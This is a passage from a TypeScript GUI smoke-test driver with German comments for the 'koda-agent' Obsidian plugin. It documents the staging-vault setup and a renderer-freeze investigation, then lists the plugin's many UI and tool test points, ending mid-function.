/**
 * GUI-Smoke-Treiber — prueft die Naht zum Host gegen ein **laufendes** Obsidian statt
 * von Hand (CORE-TEST-02 b).
 *
 * Die CDP-Bruecke liegt seit 2026-08-16 zentral im Dach (`tools/obsidian-cdp/`) und
 * wird importiert, nicht vendored: sie ist plugin-neutral und lief hier bis 2026-08-18
 * als eigene, aeltere Linie (`scripts/lib/cdp.ts`). Fehlt das Dach (fremder Checkout),
 * bricht esbuild beim Aufloesen ab — das ist die gewollte Meldung, kein Fehler dieses
 * Treibers. Was der Bruecke fehlt, wird DORT ergaenzt, nie hier nachgebaut — `clickReal`
 * kam bei dieser Migration neu hinzu (Pruefpunkt 3 unten braucht einen echten Klick).
 *
 * ## Warum es diesen Treiber gibt
 *
 * Am 2026-08-06 fror ein Klick auf „Testen“ in der Endpunkt-Zeile Obsidian 1.13.5 ein
 * (100 % CPU, beide Fenster tot). Als Ursache wurde `ButtonComponent.setDisabled()`
 * bestimmt, aufgerufen aus dem eigenen Settings-Fenster. Das Gate war zu diesem Zeitpunkt
 * **113/113 gruen** — kein Unit-Test kann diese Schicht sehen, weil es die Schicht des
 * Hosts ist. Pruefpunkt 3 ist genau dieser Klick: er misst nicht „wurde die Funktion
 * gerufen“, sondern ob der Renderer danach **noch antwortet**.
 *
 * ⚠️ **Beweisstand von Pruefpunkt 3, ehrlich:** Er ist NICHT durch eine Gegenprobe
 * validiert. Am 2026-08-07 wurde der Fix testweise ausgebaut (`setDisabled()` zurueck),
 * deployt und das Plugin neu geladen — der Freeze trat **nicht** wieder auf, weder mit
 * synthetischem noch mit echtem Mausklick, weder gegen einen erreichbaren noch gegen einen
 * toten Endpunkt. Obsidian-Version, Vault und Endpunkt waren dieselben; anders waren nur
 * die frisch gestartete App und das per `disablePlugin/enablePlugin` neu geladene Plugin.
 * Der Pruefpunkt bleibt drin, weil er billig ist und einen haengenden Renderer als
 * Zeitueberschreitung sehen wuerde — aber er hat noch nie rot geleuchtet, und was nie rot
 * war, ist unbewiesen. Wer den Freeze erneut sieht: die Bedingungen hier nachtragen.
 * Die Klaerung ist am 2026-08-07 bewusst **geparkt** worden (Entscheidung Johannes,
 * TaskNote `Freeze-Gegenprobe klaeren` im Cockpit): nicht aktiv weiterjagen, sondern beim
 * naechsten Smoke mitbeobachten — erst ein erneutes Auftreten holt sie zurueck.
 * Gegenprobe-validiert ist dagegen Pruefpunkt 6 (Handler ausgebaut → genau dieser Punkt rot).
 *
 * ## Was er bewusst NICHT prueft
 *
 * Nichts, was eine echte Modell-Antwort braucht. Gemessen am 2026-08-07 ist
 * `qwen/qwen3.6-27b` ueber einem grossen Vault **>90 s stumm**, bevor das erste Token
 * kommt — ein Pruefpunkt darauf waere langsam und nicht deterministisch. Die Faelle unten
 * kommen alle ohne Modell aus; der Failover-Fall (5) ist deshalb so wertvoll: er scheitert
 * am Resolver, lange bevor ein Modell gefragt wuerde.
 *
 * Ebenfalls nicht geprueft: das Bestaetigungs-Modal beim Schreiben ausserhalb des
 * Koda-Ordners. `VaultTools` wird in `ask()` lokal erzeugt und ist am Plugin nicht
 * exponiert — der Pruefpunkt braeuchte eine Produktionscode-Aenderung allein zur
 * Testbarkeit. Bleibt Handarbeit (`docs/SMOKE.md` Punkt 5).
 *
 * ## Lauf (Zweitinstanz, eigenes Profil, eigener Port — die regulaere Instanz wird nie angefasst)
 *
 * `--port` ist Pflicht (kein Standardport; 9222 gehoert der regulaeren Instanz). Vertrauensdialog und
 * Restricted Mode eines frischen Profils erledigt `bereiteInstanzVor` (zentrale Bruecke) vor dem ersten
 * Punkt; es gibt keinen Quit und keinen Neustart einer fremden Instanz.
 *
 * Bilanz in vier Zustaenden (CORE-TEST-19, `createBilanz`): gruen · rot · uebersprungen · nichts gemessen.
 * Nenner ist `PUNKTE` (101 Punkte); ein nie aufgezeichneter Punkt zaehlt als „nichts gemessen“ (Exit 1),
 * ein Abbruch ist Exit 2. „Uebersprungen“ heisst nur „in dieser Lage nicht anwendbar“ (Punkt 1b ohne
 * vault-rag); ein Punkt, dessen Gegenstand nicht erreicht wurde (fremder Eintrag im Weg, Einstellungsfenster
 * nicht gefunden, Ausnahme im Messpfad), ist „nichts gemessen“, nie gruen.
 *
 * ## Der Vault, gegen den geprueft wird
 *
 * Nicht der Arbeits-Vault, sondern ein eigener Staging-Vault aus dem getrackten Fixture:
 *
 * ```bash
 * npm run build                                  # der Vault soll den Stand zeigen, den du aenderst
 * npm run smoke:gui -- --setup                   # $STAGING_VAULTS_DIR/koda-agent aus docs/images/fixture/
 * ```
 *
 * Zwei Gruende, und beide sind gemessen. **Erstens schreiben die Pruefpunkte 16 und 17
 * Einstellungen** (`systemPromptOverride`, `toolsDisabled`); sie sichern ihren Vorwert und
 * schreiben ihn im `finally` zurueck, aber ein hart abgebrochener Lauf hinterlaesst trotzdem
 * einen fremden Zustand — im Arbeits-Vault waeren das Johannes' echte Einstellungen.
 * **Zweitens liegt im Arbeits-Vault der Store-Build, nicht der Repo-Stand**: vier gruene
 * Laeufe im Workspace waren am 2026-08-30 aus genau diesem Grund unbelegt, und
 * `manifest.version` verraet es nicht, weil beide Staende dieselbe Nummer tragen
 * (Dach-`AGENTS.md` § Staging-Vaults).
 *
 * Ein frisch gebauter Vault wird der Zweitinstanz ueber `obsidian.json` bekannt gemacht (Rezept unten);
 * ein `obsidian://`-Aufruf an die regulaere Instanz ist unter Obsidian 1.14 wirkungslos.
 *
 * ⚠️ Der Lauf leert das laufende Koda-Gespraech im Zielvault (Punkt 5 braucht ein frisches).
 * Der bisherige Verlauf wandert nach `.obsidian/plugins/koda-agent/sessions/archive.jsonl` und ist nicht verloren, aber
 * aus der Sidebar weg. Wer gerade an einem Verlauf misst, faehrt den Smoke davor oder danach.
 *
 * ```bash
 * UD=/tmp/obs-test-koda-agent; mkdir -p "$UD"
 * lsof -nP -iTCP:<PORT> -sTCP:LISTEN && echo "Port belegt — anderen waehlen (Port laut Auftrag bzw. frei, nie aus diesem Kommentar)"
 * pgrep -f "user-data-dir=$UD" && echo "Profil belegt — $UD-wNN nehmen, nie beenden"
 * cp ~/Library/Application\ Support/obsidian/obsidian-*.asar "$UD"/   # aktuelle Version statt gebuendelter
 * node -e 'const p=process.env.STAGING_VAULTS_DIR+"/koda-agent";require("fs").writeFileSync(process.argv[1]+"/obsidian.json",JSON.stringify({vaults:{"koda-agent":{path:p,ts:Date.now(),open:true}}}))' "$UD"
 * /Applications/Obsidian.app/Contents/MacOS/Obsidian --user-data-dir="$UD" --remote-debugging-port=<PORT> --lang=en-US &   # je Messlauf frischer Prozess, PID merken
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py acquire --label koda-agent --intent "Smoke :<PORT>" --exclusive all --port <PORT> --ttl 900
 * npm run smoke:gui -- --port <PORT> --vault koda-agent
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py release           # danach nur die eigene PID beenden
 * ```
 *
 * Der erste Lauf nach der Profilanlage ist ein Aufwaermlauf und zaehlt nicht.
 *
 * ## Pruefpunkte 43-46 (Etappe 3a, seit 2026-09-25)
 *
 * Alle vier fahren gegen einen Stub der vault-rag-API unter `app.plugins.plugins["vault-retrieval"]`
 * (Muster Punkt 41): 43 Modus Vault sucht mit der GESENDETEN Frage und meldet einen Fehlschlag
 * im Block, 44 Vault ist ohne vault-rag gesperrt (Dropdown und Befehl), 45 Modus Notiz holt
 * Nachbarn per related() und K = 0 schaltet ab, 46 die Vorschau im Kontext-Tab folgt dem
 * Entwurf im Eingabefeld (entprellt). Steht dort schon ein Eintrag, werden sie uebersprungen.
 *
 * ## Pruefpunkte 20-23 (Arbeitskontext, seit 2026-09-02)
 *
 * Vier neue Punkte messen ueber `plugin.currentContext()`, `plugin.setContextMode()`,
 * `plugin.currentToolNames()` und `plugin.buildTools()` — dieselben Methoden, die `ask()`
 * selbst ruft, kein eigener Messpfad daneben. 20 belegt, dass Notiz und Markierung den
 * Fokuswechsel in die Sidebar ueberleben; 21, dass Modus „Aus" keinen Kontext sendet und
 * Befehl und Dropdown denselben Zustand schalten; 22, dass `get_workspace` und
 * `edit_active_note` in der gesendeten Werkzeugliste stehen und einzeln abschaltbar sind;
 * 23 die Invariante von `edit_active_note` — eine seit dem Aufruf veraltete Markierung
 * schreibt nicht, eine gueltige schreibt, und erst die Gegenprobe ohne Aenderung belegt,
 * dass der Punkt seinen Gegenstand ueberhaupt beruehrt.
 *
 * Mechanik von 20 und 23 (Review-Runde 2026-09-02, `SCENE_JS`): die Notiz wird nie ueber
 * `app.workspace.getLeaf(false)` geoeffnet — das liefert nach Punkt 20s Fokus auf
 * `.koda-input` den Sidebar-Leaf statt den Hauptbereich, mit einem ZWEITEN Editor auf
 * derselben Datei. Aufgeloest wird stattdessen wie in der CDP-Bruecke selbst (`openNote`):
 * `getMostRecentLeaf(rootSplit) ?? getLeaf(true)`, nachdem alle anderen Leaves mit derselben
 * Datei geschlossen wurden. Die Kulisse kommt IMMER per `editor.setValue()` aus dem
 * getrackten Fixture, nie aus dem, was gerade im Vault liegt. Punkt 23 schreibt beim
 * Aufraeumen genauso zurueck, ueber denselben Editor: `app.vault.modify()` neben einem
 * offenen, ungespeicherten Editor-Puffer divergiert, und Obsidian fuehrt beide Staende
 * spaeter zu Artefakten zusammen — gemessen 2026-09-02 als `Model steeringl makes` mit einer
 * verschobenen Leerzeile, nicht als Abbruch.
 */

import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { cwd } from "node:process";
import { Cdp, attachTo, beimAbbruch, bereiteInstanzVor, clearNotices, clickReal, istAbgebrochen, pollUntil, requireVisible, schliesseDialog, schliesseEinstellungen } from "../../tools/obsidian-cdp/cdp.js";
import { messeFolge, zeichneFolge } from "../../tools/obsidian-cdp/folge.js";
import { createBilanz, parseArgs, runDriver } from "../../tools/obsidian-cdp/bilanz.js";
import { gegenprobeErreichbarkeit, gegenprobeFokus, messeDenkblockKopierbar, messeErreichbarkeit, messeFokusErhalt, mitHoehe, zeichnePflicht, type PflichtTeilurteil } from "../../tools/obsidian-cdp/pflichtpunkte.js";
import { startLlmStub } from "../../tools/obsidian-cdp/llm-stub.js";
import { boxOf, capture } from "../../tools/obsidian-cdp/shot.js";
import { buildVault, requireEigenerBuild, stagingVaultDir } from "../../tools/obsidian-cdp/vault.js";

const PLUGIN_ID = "koda-agent";
/** Repo- und Vault-Name sind hier dasselbe Wort — der Staging-Vault heisst wie das Repo. */
const REPO_NAME = "koda-agent";
const REPO_ROOT = cwd();
const FIXTURE_DIR = join(REPO_ROOT, "docs/images/fixture");
const VIEW_TYPE = "koda-agent-view";
/** Garantiert tote Ports fuer die Fehlerfaelle — nichts hoert dort, und ein Tippfehler
 *  im Test darf nie versehentlich einen echten Endpunkt treffen. */
const DEAD_A = "http://127.0.0.1:9999";
const DEAD_B = "http://127.0.0.1:9998";
/** Wie lange Pruefpunkt 3 NACH dem erfolgreichen Status weiter zusieht, bevor er gruen
 *  meldet. Begruendung an der Stelle selbst — kurz: ein verzoegert eintretender Freeze
 *  war vorher unsichtbar. */
const NACHBEOBACHTUNG_MS = 9000;

/** Die Fixture-Notiz, wie sie im Repo getrackt ist. Pruefpunkte 20 und 23 STELLEN SIE HER
 *  (per `editor.setValue()`, s. `SCENE_JS`), statt anzunehmen, dass der Vault noch den
 *  Auslieferungsstand zeigt — gemessen 2026-09-02: nach einem vorherigen Lauf tat er das
 *  nicht mehr, und ein hartcodierter Zeilenindex traf die falsche Zeile. */
const FIXTURE_NOTE = readFileSync(join(FIXTURE_DIR, "notes", "Notes", "Project plan.md"), "utf8");

/**
 * Kulissenbau fuer Pruefpunkt 20 und 23 — EIN String fuer beide (Review-Runde 2026-09-02,
 * Punkt 5), sonst laufen sie auseinander, wie es hier schon einmal geschehen ist.
 *
 * Nie `app.workspace.getLeaf(false)`: das liefert den zuletzt AKTIVEN Leaf, und nach Punkt
 * 20s Fokus auf `.koda-input` ist das Koda selbst — die Notiz waere dann in der SIDEBAR
 * offen, mit einem zweiten, unabhaengigen Editor fuer dieselbe Datei (gemessen 2026-09-02:
 * der Hauptbereichs-Editor, den `getMostRecentLeaf(rootSplit)` andernorts liest, sah davon
 * nichts). Der Weg hier ist derselbe wie in `openNote` der CDP-Bruecke:
 * `getMostRecentLeaf(rootSplit) ?? getLeaf(true)` als Fallback. Duplikate werden vorher
 * eingesammelt (nie waehrend der Iteration) — aber NIE der letzte Root-Leaf: zeigt schon ein
 * Root-Leaf die Notiz, bleibt GENAU der stehen (`getRoot() === root`), alle anderen werden
 * geschlossen. Grund, zweite Fix-Runde 2026-09-02: laeuft Punkt 23 direkt nach Punkt 20 und
 * der einzige Root-Leaf ist ausgerechnet der, der die Notiz schon zeigt, detachte die alte
 * Fassung genau ihn — der Root-Split stand leer, und `getLeaf(true)` schlug mit „No tab group
 * found" fehl, weil keine Tab-Gruppe mehr da war, in die er haette oeffnen koennen.
 *
 * Der Text kommt IMMER aus `FIXTURE_NOTE`, nie aus dem, was im Editor oder auf der Platte
 * gerade steht — `editor.setValue()`, nicht `vault.modify()` (dazu mehr bei Punkt 23s
 * `finally`). Die Zielzeile wird ueber ihren INHALT gesucht (`startsWith("Model control
 * makes")`), nie ueber eine angenommene Zeilennummer.
 *
 * Endet mit `leaf`, `ed`, `idx`, `path` UND der 13-Zeichen-Markierung „Model control" in
 * Scope — ausser die Funktion hat schon per `return` verlassen: `-2` wenn die Datei fehlt,
 * `-1` wenn die Zeile nicht gefunden wurde. Der Aufrufer sieht das nur am GESAMT-
 * Rueckgabewert seines eigenen `evaluate()`-Aufrufs, nicht an einer eigenen Zwischenpruefung.
 * Die Markierung setzt die Szene SELBST (dritte Fix-Runde 2026-09-02) — vorher stand das
 * jedem Aufrufer offen, und Pruefpunkt 23 erbte in Fall B die Rest-Markierung aus Fall A statt
 * einer frischen: `edit_active_note` ersetzte „Model" (5 Zeichen, uebrig vom Verkleinern in
 * Fall A) statt „Model control" (13), das Werkzeug arbeitete dabei VOELLIG korrekt und schrieb
 * „Model steering control makes" — der Test hatte schlicht seine eigene Ausgangslage nicht neu
 * hergestellt. Gemessen per Nachstellung, nicht vermutet.
 */
const SCENE_JS = `
      const path = ${JSON.stringify("Notes/Project plan.md")};
      const file = app.vault.getFileByPath(path);
      if (!file) return -2;
      const root = app.workspace.rootSplit;
      const showing = [];
      app.workspace.iterateAllLeaves((l) => { if (l.view?.file?.path === path) showing.push(l); });
      // Einen Root-Leaf mit der Datei behalten (wenn es einen gibt), alle anderen Duplikate schliessen —
      // nie den letzten Root-Leaf detachen, sonst gibt es keine Tab-Gruppe mehr ("No tab group found").
      let leaf = showing.find((l) => l.getRoot() === root) ?? null;
      for (const l of showing) if (l !== leaf) l.detach();
      if (leaf === null) leaf = app.workspace.getMostRecentLeaf(root) ?? app.workspace.getLeaf(true);
      await leaf.openFile(file);
      app.workspace.setActiveLeaf(leaf, { focus: true });
      await new Promise((r) => setTimeout(r, 500));
      const ed = leaf.view.editor;
      ed.setValue(${JSON.stringify(FIXTURE_NOTE)});
      await new Promise((r) => setTimeout(r, 300));
      const idx = ed.getValue().split("\\n").findIndex((l) => l.startsWith("Model control makes"));
      if (idx < 0) return -1;
      ed.setSelection({ line: idx, ch: 0 }, { line: idx, ch: 13 });
    `;

// --- Prüfpunkte -------------------------------------------------------------

/** Soll-Liste aller Pruefpunkte (der Nenner der Bilanz); ein Punkt, der nie aufgezeichnet wird, zaehlt als „nichts gemessen“. */
const PUNKTE = [
  "1. Plugin ist aktiv",
  "1b. Retrieval-Andockung",
  "1c. Frontmatter-Naht",
  "2. Sidebar oeffnet mit Eingabefeld, zwei Knoepfen, der SICHTBAREN Kopfzeilen-Aktion „Neues Gespraech“ und dem sichtbaren Denk-Knopf in der Modellzeile",
  "3. Klick auf „Verbindung prüfen“ friert den Renderer nicht ein",
  "4. Toter Endpunkt wird als nicht erreichbar angezeigt",
  "8. Settings-Gruppe „Verlauf kürzen“ mit Fenster-Feld",
  "49. Die Hilfe-Zeile steht als erste Zeile im Tab, mit Text-Knopf und Icon-Knopf",
  "5. Zwei tote Endpunkte ergeben Klartext, keinen Stacktrace",
  "6. Wikilink in der Antwort ist klickbar und oeffnet die Notiz",
  "7. Verdichtungs-Marken (Stufe 1 + Stufe 2, erzwungen) werden gerendert",
  "9. Statuszeile nennt die Taetigkeit und dreht sich dabei",
  "10. Statuszeile zeigt die Belegung des Kontextfensters",
  "11. Denk-Knopf der Modellzeile schaltet, ueberlebt den Neuaufbau, und der Befehl „Thinking umschalten“ schaltet denselben Wert",
  "12. „Neues Gespraech“ fragt nach, Abbruch laesst den Verlauf stehen",
  "13. Denk-Knopf der Modellzeile ist bei einem Modell, das sich nicht abschalten laesst, gesperrt (Kit-Feld locked), Klick und Befehl bleiben folgenlos",
  "16. Zuruecksetzen stellt den Auslieferungsstand her",
  "17. Abgeschaltetes Werkzeug wird nicht gesendet",
  "18. „Aktive Anweisung ansehen“ zeigt Memory und Skills",
  "19. `hide()` verwirft den Modell-Cache (toter Endpunkt bleibt nicht tot)",
  "20. Arbeitsplatz-Block nennt aktive Notiz, Kopfdaten und Markierung — aus der Sidebar heraus",
  "21. Modus Aus sendet keinen Kontext; Befehl und Dropdown schalten denselben Zustand",
  "22. get_workspace und edit_active_note stehen in der gesendeten Liste und sind abschaltbar",
  "23. edit_active_note: veraltete Markierung schreibt nicht, gueltige schreibt (Invariante Vorschau == Inhalt)",
  "24. move_note verschiebt, die Verlinkung bleibt intakt und Obsidian passt den Text an, wo noetig",
  "25. Das Move-Modal nennt beide Pfade und die Zahl der verweisenden Notizen",
  "26. delete_note fragt auch im Koda-Ordner nach und legt die Notiz in den Papierkorb",
  "27. Restaurierte, nicht besuchte Tabs (DeferredViews) stehen im Arbeitskontext",
  "28. Dieselbe Notiz in zwei Tabs steht einmal im Block, nicht zweimal",
  "29. Hub-Tabs Chat, Kontext und Faehigkeiten sind sichtbar (Hoehe > 0, nicht nur im DOM)",
  "30. Ein abgewaehlter Chip verschwindet aus dem gesendeten Block, Zuruecksetzen holt ihn wieder",
  "31. Auf/Zu-Zustand der Abschnitte landet in data.json",
  "32. Chat-Panel ist Spalten-Flex, Eingabezeile sitzt am unteren Rand (nicht im Verlauf)",
  "33. Modus Notiz schickt die aktive Notiz UND einen verlinkten Nachbarn im Volltext",
  "34. Die Budget-Kappung meldet sich im Block, statt still zu kuerzen",
  "35. Eine von Hand hinzugefuegte Notiz geht mit und laesst sich wieder entfernen",
  "36. read_note liest eine .base aus dem Fixture (und weiterhin .md)",
  "37. Quellen-Chips stehen unter der Antwort — nur Volltext-Quellen, Hoehe > 0",
  "38. Kontext-Tab zeigt einen sichtbaren Fehlerzustand, wenn das ViewModel ablehnt",
  "39. Knopf '+ Aktive Notiz' und Befehl context-add-active landen auf demselben Zustand",
  "40. Abgeschnittene Antwort (finish_reason length, mit Text) meldet einen Hinweis statt zu schweigen",
  "41. llm-lab-Meldestrecke (Konsumenten-Seite): turnId/promptTemplate/Nachrichten korrekt gemeldet",
  "42. list_notes nennt Unterordner, auch einen ohne Notiz; fehlender Ordner als nicht existent",
  "43. Modus Vault: Treffer zur gesendeten Frage im Volltext, Fehlschlag meldet sich",
  "44. Modus Vault ist ohne vault-rag gesperrt (Dropdown und Befehl)",
  "45. Modus Notiz: semantische Nachbarn aus related(), K = 0 schaltet ab",
  "46. Kontext-Tab: Vault-Vorschau folgt dem Entwurf im Eingabefeld (entprellt)",
  "47. Werkzeug-Anbieter: montiert, geroutet, abschaltbar, entfernt",
  "48. list_notes mit depth zeigt den Ordnerbaum, leere Ordner der zweiten Ebene inklusive",
  "50. HTTP 200 mit JSON-Fehlerkörper meldet die Servermeldung statt einer leeren Antwort (Kit-Chat-Client)",
  "51. Datum und Uhrzeit: ## Now im Prompt und get_datetime nennen den Kalendertag der Renderer-Uhr",
  "52. Skills laden zweistufig: pinned voll, der Rest nur als Beschreibung, load_skill holt den Body und hält den Pfad-Guard",
  "53. Byte-Token-Guard: <0xF0><0x9F><0x97><0x82> landet als 🗂 in der Datei, eine abgeschnittene Folge wird abgelehnt",
  "54. Kontextfenster-Hinweis: Notice mit Übernehmen-Knopf, Einstellung bleibt bis zum Klick, zweiter Aufruf schweigt",
  "55. Vision: read_image bringt das Bild als image_url-Part im Tool-Ergebnis, der Verlauf traegt nur den Pfad",
  "56. OCR: read_image liefert dem Text-Modell den erkannten Text, ohne Anbieter fehlt das Werkzeug",
  "57. generate_image: im Koda-Ordner frei, sonst Rueckfrage VOR der Erzeugung, Ablehnung erzeugt nichts",
  "58. Vision-Fehler: HTTP 400 nach einem Bild faellt auf Texterkennung zurueck, die Runde wiederholt sich",
  "59. Schwaerzung: edit_active_note mit Bearer-Token — der Draht sieht nur den Platzhalter (auch in den Tool-Argumenten der 2. Runde), die Notiz bekommt das Original",
  "62. Lab-Telemetrie traegt den gesendeten Text (Platzhalter), nicht das Original",
  "60. Schluesselbund: Klartext-Schluessel verlaesst data.json beim Aufloesen, der Authorization-Header traegt ihn weiter",
  "61. Neutralisierung: eine Antwort mit Bild-URL und dataviewjs-Block rendert als Text, auch im neu gezeichneten Verlauf",
  "63. Globales Modell-Feld abgeschafft: Altwert wandert in die Zeile, keine Zeile „Model“, keine Option „global model“",
  "64. Kontextlaenge je Endpunkt-Zeile: geladen und hoechstens unter der Zeile, Leer-Option „Server waehlt“, eine Anfrage je Zeile und Modell",
  "65. Strom: der Verlauf folgt dem Ende, solange niemand eingreift (Kontrolle zu 66)",
  "66. Folge-Regel: Hochscrollen mitten im Strom wird respektiert, der Verlauf springt nicht zurueck",
  "67. Denkblock live: der Reasoning-Text ist waehrend des Stroms sichtbar und waechst",
  "68. Strom mit absatzgrossen Stuecken: der Verlauf folgt dem Ende auch bei Spruengen ueber die Folge-Schwelle (Kit 0.59.0, withFollow)",
  "69. Folge-Regel, zweite Haelfte: steht der Nutzer wieder unten, folgt der Verlauf dem Strom wieder",
  "70. Gescheiterte Anfrage: zwei Sendungen gegen einen Endpunkt mit HTTP 500 ergeben zwei Fragen und zwei Fehlerblasen — im Verlauf, im DOM und im JSONL",
  "71. Einstellungen (nativer Pfad): nach zwei Werkzeug-Schaltern steht genau eine Werkzeugliste, die Anweisungs-Textarea ist breiter als 200 px",
  "72. list_notes nennt .base und .canvas auf einer eigenen Zeile und je Unterordner, ohne sie als Notizen zu zaehlen",
  "73. open_note oeffnet eine vorhandene Notiz im Workspace, ein unbekannter Pfad legt nichts an",
  "74. write_note create: eine gleichnamige Notiz in einem anderen Ordner wird abgewiesen und der vorhandene Pfad genannt",
  "75. Netzfehler-Fallback: bricht die erste Verbindung ab, streamt die zweite Anfrage wieder (stream:true) und die Antwort kommt an",
  "77. Gemma 4 ohne Öffner: der Denktext steht im Denkblock, nicht in der Antwort (Stream und Verlauf)",
  "78. Anbieter-Werkzeug: ein Aufruf gegen das Schema (Pflichtfeld fehlt, unmögliches Datum) erreicht den Anbieter nicht, ein gültiger schon",
  "76. Einstellungen: Werkzeuge eines Anbieter-Plugins stehen in eigener Gruppe mit Schalter, ein Anbieter ohne version nennt seinen Grund, der Schalter schreibt toolsDisabled",
  "79. Tab „Fähigkeiten“: sichtbar, ein Klick auf „ganz“ bringt den Skill-Text in den nächsten Prompt, der Overlay-Punkt erscheint und verschwindet mit dem Zurückschalten",
  "80. Skill im Gespräch abgeschaltet: fehlt im Prompt, load_skill lehnt ab, ein früheres load_skill-Ergebnis wird in der Projektion zum Hinweis und steht im Chat wörtlich",
  "81. Arbeit mit „übrige-skills: aus“: nur die genannten Skills im Prompt, Modus und Tiefe aus der Arbeit, Ordner zu Einzelpfaden, ungültige und fehlende Einträge als Hinweis",
  "82. „Speichern“ schreibt die Abweichung in die Arbeits-Notiz, der Text darunter bleibt; der Schalter „Hinweis statt zweitem Skill-Text“ schaltet die Regel ab",
  "83. Sitzungs-Marke: nach einer Frage steht sie im JSONL, nach dem Neuladen sind Arbeit und Overlay zurück, „Neues Gespräch“ behält die Arbeit und leert das Overlay",
  "84. „/“-Menü: zwei Gruppen, Enter wählt und sendet nicht, Escape schließt, bei geschlossener Liste sendet Enter wie bisher, eine URL öffnet nichts",
  "85. Regler „Tiefe“ im Kontext-Tab gilt für das Gespräch: die wirksame Tiefe ändert sich, die Einstellung nicht",
  "86. Bases: Übernahme als Tabelle, Default aus dem Lesecode, fehlende Werte leer",
  "87. Bases: Übergabeform Notizen schickt die Zeilen im Volltext",
  "88. Base in der Arbeit: die Arbeit öffnet die Base und übernimmt sie selbst, eine Ansicht fremden Typs wird mit Hinweis abgelehnt, „Neues Gespräch“ übernimmt frisch",
  "89. Denkblock nach der Antwort: zugeklappt vor der Antwort, mit der Sitzung im JSONL, nie am Draht; der Schalter „Denken aufbewahren“ aus lässt ihn verschwinden",
  "90. Denkblock kopierbar während des Stroms (Kit-Knopf): der Klick kopiert den bisherigen Denktext und klappt den Block nicht zu",
  "91. Denkblock kopierbar nach der Antwort: der Klick kopiert den ganzen Denktext, quittiert mit is-copied und klappt den Block nicht auf",
  "92. Pflichtpunkt Fokus: ein getippter Text im Eingabefeld überlebt ein Neuzeichnen, das Feld behält den Fokus",
  "93. Gegenprobe Fokus: ein Neuzeichnen mit Fokusverlust macht Punkt 92 rot",
  "94. Pflichtpunkt Erreichbarkeit: jedes Bedienelement des Chats ist bei langem Verlauf noch zu treffen (Mitte per elementFromPoint)",
  "95. Pflichtpunkt Erreichbarkeit im kurzen Panel (420 px Höhe)",
  "96. Gegenprobe Erreichbarkeit: ohne Rollbalken am Verlauf wird ein Bedienelement unerreichbar",
  "97. Werkzeugliste: jedes Beschreibungsfeld zeigt seinen Inhalt in ganzen Zeilen, keine halb abgeschnittene Zeile am unteren Rand, mindestens drei Zeilen hoch",
  "98. Handpunkt 17 an der Naht: ist der Embedding-Endpunkt nicht erreichbar, stehen die Volltext-Treffer UND die Zeile „(semantisch: Embedding-Endpunkt nicht erreichbar …)“ im Ergebnis; erreichbar fehlt die Zeile",
  "102. Modellzeile: der Chat-Tab trägt genau eine Zeile des Kits („Koda“) mit Dropdown, aria-label, Neu-laden-Knopf und dem Denk-Knopf des Kits; im Kopf bleibt nur „Neues Gespräch“",
  "103. Modellzeile: ein Wechsel im Dropdown ändert das gesendete Modell und das Modell der Zeile in den Einstellungen, „Automatisch“ stellt es zurück",
  "104. Modellzeile: ein Wechsel des Modells in den Einstellungen zeichnet das Dropdown nach",
  "105. Modellzeile: im Lauf gesperrt (Dropdown UND Denk-Knopf), danach frei",
  "106. Linkschutz: im Strom und im Verlauf hat keiner der Links mit javascript:, data:, file:, obsidian: oder app: ein Ziel, ein [[javascript:…]]-Klick öffnet nichts und ein gewöhnlicher innerer Link schon",
  "107. Einstellungen: die Gruppe „Links and images in answers“ hat zwei Schalter, beide aus, und ein Umlegen schreibt die Einstellung (und zurück)",
  "99. Handpunkt 18 an der Naht: ohne vault-rag keine semantische Beschriftung; mit dem Stub ist sie da, und Koda traegt related_notes nie selbst (es kommt nur ueber einen Anbieter, Punkt 78)",
  "100. Gegenprobe Denkblock kopierbar nach der Antwort: lehnt die Zwischenablage den Schreibversuch ab, quittiert der Knopf nicht",
  "101. Gegenprobe Denkblock kopierbar während des Stroms: lehnt die Zwischenablage den Schreibversuch ab, quittiert der Knopf nicht",
] as const;
const bilanz = createBilanz({ punkte: PUNKTE });
const { skipped, unmeasured, abschluss } = bilanz;

/**
 * Aufzeichnung eines gemessenen Punkts. Zwei Konventionen des alten Treibers werden hier auf die
 * vier Zustaende (CORE-TEST-19) abgebildet, damit sie nirgends als gruen oder rot durchgehen:
 *   - „uebersprungen — …“ mit passed = true (ein echtes Plugin oder ein Rest eines abgebrochenen Laufs
 *     steht dem Stub im Weg): der Gegenstand wurde NICHT erreicht → nichts gemessen.
 *   - „Abbruch: …“ mit passed = false (eine Ausnahme im Messpfad): ebenfalls nichts gemessen, nicht rot.
 */
function record(name: (typeof PUNKTE)[number], passed: boolean, detail = ""): void {
  if (passed && detail.startsWith("uebersprungen")) unmeasured(name, detail);
  else if (!passed && detail.startsWith("Abbruch:")) unmeasured(name, detail);
  else bilanz.record(name, passed, detail);
}

interface Settings {
  endpoints: { url: string; model?: string; apiKey?: string }[];
  timeoutSec: number;
  /** Pruefpunkt 13 setzt das Modell voruebergehend auf einen Always-on-Namen. */
  model: string;
  suppressThinking: boolean;
}

/**
 * Ein erreichbarer Endpunkt, den der Treiber selbst mitbringt.
 *
 * Warum nicht einfach den konfigurierten nehmen: der Freeze vom 2026-08-06 trat beim
 * **funktionierenden** Endpunkt auf — gegen einen toten schlaegt die Probe zu frueh fehl
 * und der Defekt bleibt unsichtbar. Die erste Fassung dieses Treibers klickte gegen einen
 * toten Port und meldete deshalb 6/6 gruen, obwohl die Freeze-Version eingebaut war
 * (gemessen 2026-08-07 in der Gegenprobe). Ein eigener Server macht den Pruefpunkt
 * unabhaengig davon, ob gerade ein LLM-Server laeuft.
 *
 * `requestUrl` umgeht CORS, deshalb genuegen hier nackte JSON-Antworten.
 */
async function startFakeEndpoint(
  wunschPort = 0,
  // Nur fuer Pruefpunkt 40: eine kanonische OpenAI-SSE-Antwort auf POST /v1/chat/completions,
  // mit finish_reason "length" — der Rest bleibt unveraendert (Verbindungsprobe, /v1/models).
  // Fuer Pruefpunkt 50 statt dessen `errorBody`: HTTP 200 mit einem JSON-Fehler im Koerper
  // (LM Studio meldet z. B. „model not loaded“ so) — der Kit-Client liest ihn als Fehler.
  chatStub?: { content: string; finishReason: string; errorBody?: string },
): Promise<{ url: string; port: number; close: () => Promise<void> }> {
  // Seit Welle 20 der zentrale Stub (`tools/obsidian-cdp/llm-stub.ts`); CORS ist an (Preflight 204), die
